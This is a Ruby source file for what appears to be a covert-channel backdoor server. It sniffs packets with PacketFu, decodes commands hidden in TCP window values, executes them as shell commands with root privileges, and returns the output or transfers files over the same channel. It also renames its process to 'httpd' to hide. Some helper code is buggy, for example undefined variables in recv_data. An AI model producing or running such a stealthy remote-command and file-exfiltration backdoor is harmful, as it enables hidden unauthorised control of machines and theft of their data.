#!/usr/bin/env ruby
require 'rubygems'
require 'optparse'
require 'packetfu'


# -----------------------------------------------------------------------------------------
# print_usage()
#
# Prints the application usage information.
# 
# -----------------------------------------------------------------------------------------

def print_usage()
    puts "ruby server.rb -p <listening port> -i <listening interface, default \"em1\">
               -f <optional filter override (if using custom client, this may be useful)>"
    exit()
end
# -----------------------------------------------------------------------------------------
#	listen()
#    
# Listens for packets on the specified interface. Our dispatcher logic is here. Listen for
# specific client commands (get). Future additions - add funcitonality to grab a file from
# the server? Configure server settings? Restart script?
#
# -----------------------------------------------------------------------------------------

def listen()

	cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true, :filter => @options[:filter], :promisc => true)
	command = nil
    commands = nil
	cap.stream.each do | pkt |

		if PacketFu::TCPPacket.can_parse?(pkt) then

			packet = PacketFu::Packet.parse(pkt)
    
				# if a FIN comes in then we have our complete command
				if packet.tcp_flags.fin == 1 then

                    commands = command.split(' ')

                    if commands[0] == "get" then
                        send_file(commands[1], packet)
                        
                    elsif commands[0] == "put" then
                        recv_file(commands[1], packet)
                    else
                        exec_command(command, packet)

				    end
				    command = nil  
				else #not a fin packet recieved
					if command.nil? then
						command = decode(packet.tcp_win)
					else
						command << decode(packet.tcp_win)
					end
				end #FIN
		end #can parse
	end #capture	
end

# -----------------------------------------------------------------------------------------
#	decode(int)
#    
# Decodes our integer and returns the ascii character
#
# -----------------------------------------------------------------------------------------
def decode(int)
    return ((int * 5)/20).chr

end
# -----------------------------------------------------------------------------------------
#	exec_command(command)
#    
# Executes a command on the server, grabes the output and sends it back to the client.
#
# -----------------------------------------------------------------------------------------

def exec_command(command, packet)

    begin
	    result = `#{command}`
	rescue Exception => e
	    result =  e.to_s
	end    
	  
	#send result back to client
	send_data(result, packet)
	
	listen()
	
end
# -----------------------------------------------------------------------------------------
#	recv_file(filename, packet)
#    
# Recieves a file from the client
# -----------------------------------------------------------------------------------------
def recv_file(filename, packet)
   

    content = recv_data(packet)

    file = File.open(filename, 'wb')
    content.each_byte do |c|
        file.putc(c)
    end
    file.close()
    puts "Recieved: #{filename}"
    return

end

# -----------------------------------------------------------------------------------------
#
# recv_data()
#
# Waits for some data from the server (the output of a command) and returns it.
# Optional argument to display it.
#
# -----------------------------------------------------------------------------------------
def recv_data(packet)

    data = nil
    cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true,
                :promisc => true, :filter => @options[:filter])    
    
    cap.stream.each do | pkt |

        if PacketFu::TCPPacket.can_parse?(pkt) then
            packet = PacketFu::Packet.parse(pkt)
            
                if packet.tcp_flags.fin == 1 then
                    return data
                else
                    if data.nil? then
                            data = decode(packet.tcp_win)

                    else #not nill
                       data << decode(packet.tcp_win)                               
                            
                    end 
            end #fin == 1
         
        end #can_parse()
    end #capture
    puts output
    if display == true
        puts output
    end
end
# -----------------------------------------------------------------------------------------
# Send a file back to the client
#    
# Executes a command on the server, grabes the output and sends it back to the client.
#
# -----------------------------------------------------------------------------------------

def send_file(filename, packet)

    if File.exist?(filename) then
        file = File.open(filename, "rb")
        content = file.read
        file.close
    else # exist?
        send_data("#", packet)
    end # exist? else

    send_data(filename, packet)
    send_data(content, packet)
    puts "Sent #{filename}"
    return
    
end

# -----------------------------------------------------------------------------------------
#	send_data(string)
#    
# Sends data back to the client followed by a FIN packet to indicate completion.
#
# -----------------------------------------------------------------------------------------
def send_data(string, packet)

	pkt = PacketFu::TCPPacket.new

	#send the data
	unless string.nil? 
	    string.each_byte do |char|
	        pkt.eth_saddr = @options[:ifconfig][:eth_saddr]				
		    pkt.ip_daddr = packet.ip_saddr #the servers ip
		    pkt.ip_saddr = packet.ip_daddr #the senders ip

		    pkt.tcp_flags = PacketFu::TcpFlags.new(:syn => 1)	
		    pkt.tcp_win = char
		    pkt.recalc
		    pkt.to_w(@options[:iface])
	    end
	end
	
	#send a FIN to indicate completion
	pkt_f = PacketFu::TCPPacket.new
	pkt_f.eth_saddr = @options[:ifconfig][:eth_saddr]
	pkt_f.ip_daddr = packet.ip_saddr #the servers ip
	pkt_f.ip_saddr = packet.ip_daddr #the senders ip
	pkt_f.tcp_flags = PacketFu::TcpFlags.new(:fin => 1)
	pkt_f.recalc
	pkt_f.to_w(@options[:iface])


end
# -----------------------------------------------------------------------------------------
#
#    Application entry point. Get options, make root, and waits for input
#
# -----------------------------------------------------------------------------------------

@options = {}

# Set defaults for options
@options[:iface] = "em1" 
@options[:filter] = ""
@options[:port] = ''
optparser = OptionParser.new do | opts |
    
    opts.on('-h', '--help','Display usage') do
        print_usage()    
        end
        opts.on('-p' '--port LISTEN PORT','The port to listen on.') do |p|
            @options[:port] = p;    
        end
        opts.on('-i' '--iface INTERFACE','The interface to listen on.') do |i|
            @options[:iface] = i;    
        end
        opts.on('-f' '--filter FiLTER','The filter to listen on. For optional override.') do |f|
            @options[:filter] = f;    
        end
end.parse! #optparse

raise "Must be run as root" unless Process.uid == 0
$0 = "httpd"

#usually filter isnt supplied but that's okay. We'll build it ourself.
if @options[:filter] == '' then
	
	@options[:filter] ="tcp dst port " + @options[:port]

end
@options[:ifconfig] = PacketFu::Utils.whoami?(:iface => @options[:iface])
begin
    listen()
rescue Interrupt
    exit()
end

